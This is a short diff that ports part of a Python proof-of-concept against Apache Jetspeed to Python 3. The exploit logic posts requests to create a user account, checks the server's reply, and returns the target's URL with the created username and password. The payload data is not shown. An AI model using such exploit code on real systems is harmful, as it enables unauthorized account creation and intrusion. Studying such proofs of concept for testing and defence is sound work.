@@ -39,15 +39,15 @@ def poc(url):
         'newrule': ''
     }
     try:
-        requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False)
-        c = requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False).content
+        requests.post(url1, data=data1, headers={'User-Agent': firefox()}, timeout=10, verify=False)
+        c = requests.post(url1, data=data1, headers={'User-Agent': firefox()}, timeout=10, verify=False).content
         # response: org.apache.jetspeed.security.SecurityException.PRINCIPAL_ALREADY_EXISTS
-        if 'PRINCIPAL_ALREADY_EXISTS' in c:
+        if b'PRINCIPAL_ALREADY_EXISTS' in c:
             if not ENABLE_EXP:
                 return True
         else:
             return False
-    except Exception, e:
+    except Exception as e:
         if not ENABLE_EXP:
             return False
 
@@ -65,7 +65,7 @@ def poc(url):
     }
     try:
         r = requests.post(url2, data=data2, headers={'User-Agent': firefox}, timeout=10, verify=False)
-        if len(r.content) < 10 and 'true' in r.content:
+        if len(r.content) < 10 and b'true' in r.content:
             return '%s |user:%s |pass:%s' % (url, user, password)
     except Exception:
         return False
